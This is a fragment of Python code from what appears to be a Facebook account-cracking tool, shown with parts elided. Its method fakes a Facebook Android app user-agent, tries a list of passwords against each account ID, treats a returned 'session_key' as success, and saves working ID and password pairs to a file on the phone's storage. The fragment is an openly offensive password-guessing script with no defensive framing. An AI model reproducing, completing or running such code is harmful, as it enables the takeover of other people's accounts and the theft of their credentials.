...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/214.0.0.28545;FBBV/808174355;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/808174355;FBCR/Banglalink;FBMF/OPPO;FBBD/OPPO;FBPN/a;FBDV/GT-S5312B;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     open('/sdcard/SWAG-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
